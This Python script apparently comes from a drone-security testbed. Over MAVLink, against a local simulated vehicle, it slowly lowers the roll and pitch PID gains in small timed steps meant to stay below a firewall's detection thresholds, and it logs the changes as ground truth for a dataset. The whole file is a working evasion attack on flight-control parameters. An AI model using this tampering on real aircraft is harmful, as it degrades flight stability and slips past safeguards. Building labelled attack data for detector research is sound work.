#!/usr/bin/env python3
"""
Evasive Control-Aware Attack: Low-and-Slow PID Drift
Designed to evade static firewall thresholds by keeping change frequency
to < 3 changes per 30s, and capping total drift at < 15%.
"""

import time
import csv
import os
import sys
import random
import argparse
from pymavlink import mavutil

CONNECTION_STRING = 'udp:127.0.0.1:14552'  
ATTACK_LOG_DIR = '/mnt/hgfs/Dataset/AttackGroundTruth'

HOME_LAT = -35.363262
HOME_LON = 149.165237
TARGET_PARAMS = ['ATC_RAT_RLL_P', 'ATC_RAT_PIT_P']
DEFAULT_GAIN = 0.135

def flush_mavlink_buffer(mav):
    while mav.recv_match(blocking=False) is not None:
        pass

def wait_ack(mav, command_name):
    ack = mav.recv_match(type='COMMAND_ACK', blocking=True, timeout=5)
    return ack is not None and ack.result == mavutil.mavlink.MAV_RESULT_ACCEPTED

def set_mode(mav, mode_name):
    mode_id = mav.mode_mapping()[mode_name]
    mav.mav.set_mode_send(
        mav.target_system, mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mode_id)
    time.sleep(1)

def arm(mav):
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
    return wait_ack(mav, 'ARM')

def takeoff(mav, alt):
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_NAV_TAKEOFF, 0, 0, 0, 0, 0, 0, 0, alt)
    return wait_ack(mav, 'TAKEOFF')

def goto(mav, lat, lon, alt):
    mav.mav.set_position_target_global_int_send(
        0, mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000, int(lat * 1e7), int(lon * 1e7), alt,
        0, 0, 0, 0, 0, 0, 0, 0)

def wait_until_altitude(mav, target_alt, tolerance=0.5, timeout=60):
    flush_mavlink_buffer(mav)
    start = time.time()
    while time.time() - start < timeout:
        msg = mav.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=5)
        if msg and abs(msg.relative_alt / 1000.0 - target_alt) < tolerance:
            return True
    return False

def set_param(mav, param_id, value):
    mav.mav.param_set_send(
        mav.target_system, mav.target_component,
        param_id.encode('utf-8'), value,
        mavutil.mavlink.MAV_PARAM_TYPE_REAL32)

def generate_waypoints(seed, n_points=4):
    rng = random.Random(seed)
    waypoints = []
    for _ in range(n_points):
        d_lat = rng.uniform(-0.0012, 0.0012)
        d_lon = rng.uniform(-0.0012, 0.0012)
        waypoints.append((HOME_LAT + d_lat, HOME_LON + d_lon))
    return waypoints

def land(mav):
    flush_mavlink_buffer(mav)
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_NAV_LAND, 0, 0, 0, 0, 0, 0, 0, 0)
    wait_ack(mav, 'LAND')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--seed', type=int, default=300)
    args = parser.parse_args()

    os.makedirs(ATTACK_LOG_DIR, exist_ok=True)
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    gt_filename = f'{ATTACK_LOG_DIR}/attack_pid_evasive_seed{args.seed}_{timestamp}.csv'

    mav = mavutil.mavlink_connection(CONNECTION_STRING)
    mav.wait_heartbeat()
    
    for p in TARGET_PARAMS:
        set_param(mav, p, DEFAULT_GAIN)
    time.sleep(1)

    takeoff_alt = 10.0
    set_mode(mav, 'GUIDED')
    if not arm(mav):
        print('ABORT: arm failed'); sys.exit(1)
    if not takeoff(mav, takeoff_alt):
        print('ABORT: takeoff failed'); sys.exit(1)
    if not wait_until_altitude(mav, takeoff_alt):
        print('ABORT: never reached altitude'); sys.exit(1)

    print('Takeoff complete. Beginning EVASIVE Low-and-Slow Attack...')
    waypoints = generate_waypoints(args.seed)
    
    # Evasion parameters: 1 change every 11s, capping at 14.0% drift
    steps = 4 
    drift_per_step = 0.035 
    interval_s = 11.0 
    
    current = {p: DEFAULT_GAIN for p in TARGET_PARAMS}

    with open(gt_filename, 'w', newline='') as gt_file:
        gt_writer = csv.writer(gt_file)
        gt_writer.writerow(['t_wall', 'event', 'param', 'old_value', 'new_value'])
        gt_writer.writerow([time.time(), 'attack_start', '', '', ''])

        for step in range(steps):
            # Issue a waypoint command to keep the drone banking and moving
            lat, lon = waypoints[step]
            goto(mav, lat, lon, takeoff_alt)

            for p in TARGET_PARAMS:
                old_val = current[p]
                new_val = old_val * (1 - drift_per_step)
                set_param(mav, p, new_val)
                gt_writer.writerow([time.time(), 'param_set', p, old_val, new_val])
                current[p] = new_val
            
            print(f'Evasive Step {step+1}/{steps}: Gains reduced to {current["ATC_RAT_RLL_P"]:.4f}. Sleeping {interval_s}s...')
            time.sleep(interval_s)
            
        gt_writer.writerow([time.time(), 'attack_end', '', '', ''])
        
        print('Commanding return transit to HOME under peak 14.0% degradation...')
        goto(mav, HOME_LAT, HOME_LON, takeoff_alt)

        print('Monitoring physical impact of 14.0% degraded gains (20s)...')
        max_roll, max_rollspeed = 0.0, 0.0
        start = time.time()
        while time.time() - start < 20:
            msg = mav.recv_match(type='ATTITUDE', blocking=False)
            if msg:
                max_roll = max(max_roll, abs(msg.roll))
                max_rollspeed = max(max_rollspeed, abs(msg.rollspeed))
                
        gt_writer.writerow([time.time(), 'observed_max_roll_rad', '', '', max_roll])
        gt_writer.writerow([time.time(), 'observed_max_rollspeed_rad_s', '', '', max_rollspeed])
        print(f"Max physical excursion: Roll {max_roll:.3f} rad, Rollspeed {max_rollspeed:.3f} rad/s")

    print('Attempting landing...')
    land(mav)
    print('Evasive attack complete. The firewall SHOULD have allowed this, but physical flight should remain stable.')

if __name__ == '__main__':
    main()